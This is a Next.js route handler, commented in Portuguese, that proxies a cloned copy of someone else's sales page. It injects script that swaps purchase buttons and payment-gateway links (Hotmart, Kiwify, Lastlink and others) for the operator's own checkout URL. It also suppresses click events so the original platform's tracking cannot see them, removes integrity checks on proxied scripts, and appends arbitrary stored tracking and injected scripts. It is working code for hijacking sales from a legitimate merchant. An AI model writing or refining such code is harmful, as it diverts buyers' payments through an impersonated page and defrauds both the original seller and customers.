import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

/**
 * Page Proxy God Mode v7.0 — Original Stable
 */

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    // 1. Buscar página com fallback inteligente
    let { data: page, error } = await supabaseAdmin
      .from('cloned_pages')
      .select('*')
      .eq('id', id)
      .single();

    // Se não achar pelo ID (ex: /p/resultado), pega o último clone para manter a navegação ativa
    if (error || !page) {
      const { data: fallback } = await supabaseAdmin
        .from('cloned_pages')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1)
        .single();
      page = fallback;
    }

    if (!page || !page.original_url) {
      return new NextResponse('<h1>Página não encontrada</h1>', { status: 404 });
    }

    const config = page.config || {};
    const originalUrl = page.original_url;
    const checkoutUrl = config.checkout_url || '';

    const response = await fetch(originalUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      },
    });

    if (!response.ok) {
      return new NextResponse(`<h1>Erro site original (${response.status})</h1>`, { status: 502 });
    }

    const buffer = await response.arrayBuffer();
    const rawHtml = new TextDecoder('utf-8').decode(buffer);
    const $ = cheerio.load(rawHtml);
    const baseUrl = new URL(originalUrl).origin;
    const targetHost = new URL(originalUrl).host;
    const currentOrigin = req.nextUrl.origin;

    // Detectar SPA (React/Vue/Vite): corpo quase vazio + elemento raiz
    const bodyText = $('body').text().trim();
    const hasSpaRoot = $('[id="root"],[id="app"],[id="__next"],[data-reactroot]').length > 0;
    const isSpa = bodyText.length < 300 && hasSpaRoot;

    // 1. BASE TAG (O que resolvia lindamente)
    $('base').remove();
    $('head').prepend(`<base href="${originalUrl}">`);

    // 1b. SPA ENGINE — intercepta fetch/XHR e corrige assets dinâmicos
    if (isSpa) {
      const spaEngine = `<script>
(function(){
  var B='${baseUrl}',H='${targetHost}';
  window.__PROXY_HOST__=H;window.__PROXY_ORIGIN__='https://'+H;

  // Redireciona fetch relativo para domínio original
  var _f=window.fetch.bind(window);
  window.fetch=function(input,init){
    if(typeof input==='string'&&input.startsWith('/')&&!input.startsWith('//')){input=B+input;}
    return _f(input,init);
  };

  // Redireciona XHR relativo para domínio original
  var _o=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(){
    var a=Array.prototype.slice.call(arguments);
    if(typeof a[1]==='string'&&a[1].startsWith('/')&&!a[1].startsWith('//')){a[1]=B+a[1];}
    return _o.apply(this,a);
  };

  // Corrige assets (src/href) adicionados dinamicamente pela SPA
  function fix(el){
    if(!el||!el.getAttribute)return;
    ['src','href','poster'].forEach(function(a){
      var v=el.getAttribute(a);
      if(v&&v.startsWith('/')&&!v.startsWith('//')&&!v.includes('/api/')){el.setAttribute(a,B+v);}
    });
  }
  new MutationObserver(function(ms){
    ms.forEach(function(m){
      m.addedNodes.forEach(function(n){
        if(n.nodeType===1){fix(n);if(n.querySelectorAll)n.querySelectorAll('[src],[href],[poster]').forEach(fix);}
      });
    });
  }).observe(document.documentElement,{childList:true,subtree:true});
})();
</script>`;
      $('head').prepend(spaEngine);
    }

    // 2. Script para Checkout (Simples como o 1º Botão)
    const engineScript = `
      <script>
        (function() {
          const CHECKOUT_URL = '${checkoutUrl}';
          const gateways = ['checkout', 'pay.', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay', 'lastlink', 'kirvano'];
          
          function patch() {
            if (!CHECKOUT_URL) return;

            // Bloqueador de espiões: Impede que o clique suba para a Lastlink
            const blockSpy = (e) => {
                e.stopPropagation();
                e.stopImmediatePropagation();
            };

            // 1. Tag A (O Primeiro Botão, totalmente funcional)
            document.querySelectorAll('a').forEach(el => {
              const h = (el.getAttribute('href') || '').toLowerCase();
              if (!el.dataset.patched && ((h.startsWith('http') || h.startsWith('//')) && gateways.some(g => h.includes(g)) || el.dataset.checkout)) {
                el.dataset.patched = 'true';
                el.href = CHECKOUT_URL;
                // Impede vazamento do clique
                el.onclick = blockSpy;
                el.onmousedown = blockSpy;
                el.ontouchstart = blockSpy;
              }
            });

            // 2. O Segundo Botão (Transformado numa Tag A idêntica para funcionar igual ao 1º botão)
            document.querySelectorAll('button').forEach(btn => {
                const text = (btn.textContent || '').trim().toUpperCase();
                
                if (text.includes('OBTER MEU PLANO PERSONALIZADO') || text.includes('COMPRAR AGORA') || btn.id === '39Kr7c') {
                    if (!btn.dataset.patched) {
                        // Cria o Link <a>
                        const link = document.createElement('a');
                        link.href = CHECKOUT_URL;
                        link.innerHTML = btn.innerHTML; // Copia o interior do botão
                        link.className = btn.className; // Copia as classes CSS
                        link.dataset.patched = 'true';
                        
                        // Mantém o ID para não quebrar a formatação visual (CSS)
                        link.id = btn.id;
                        
                        // Garante que a aparência se preserve
                        link.style.cssText = btn.style.cssText;
                        link.style.textDecoration = 'none';
                        
                        // Se o botão era inline, transforma o link em inline-block para suportar margens
                        const displayStyle = window.getComputedStyle(btn).display;
                        if (displayStyle === 'inline' || displayStyle === '') {
                             link.style.display = 'inline-block';
                        }
                        
                        // Corta a comunicação com qualquer script da Lastlink no momento do clique
                        link.onclick = blockSpy;
                        link.onmousedown = blockSpy;
                        link.ontouchstart = blockSpy;
                        link.onpointerdown = blockSpy;
                        link.ontouchend = blockSpy;

                        // Tira o botão original da tela e coloca o nosso link <a> no lugar
                        btn.parentNode.replaceChild(link, btn);
                    }
                }
            });
          }
          // Roda rápido (1 segundo) para garantir que troca o botão antes do usuário rolar até ele
          setInterval(patch, 1000);
        })();
      </script>
    `;
    $('head').append(engineScript);

    // 3. Proxy de Assets (Para não dar tela preta)
    $('[src], [href]').each((_, el) => {
      const tag = $(el).prop('tagName');
      const attr = $(el).attr('src') ? 'src' : 'href';
      let val = $(el).attr(attr) || '';
      if (!val || val.startsWith('data:') || val.startsWith('javascript:') || val.startsWith('#')) return;

      if (tag === 'SCRIPT' || (tag === 'LINK' && $(el).attr('rel') === 'stylesheet')) {
        const abs = val.startsWith('/') ? baseUrl + val : (val.startsWith('http') ? val : baseUrl + '/' + val);
        $(el).attr(attr, `${currentOrigin}/api/proxy?url=${encodeURIComponent(abs)}&overrideHost=${targetHost}`);
        $(el).removeAttr('integrity').removeAttr('crossorigin');
      }
    });

    if (config.pixel_script) $('body').append(config.pixel_script);
    if (config.head_scripts) $('head').append(config.head_scripts);
    if (config.body_scripts) $('body').append(config.body_scripts);

    return new NextResponse($.html(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });

  } catch (error: any) {
    return new NextResponse(`Erro: ${error.message}`, { status: 500 });
  }
}
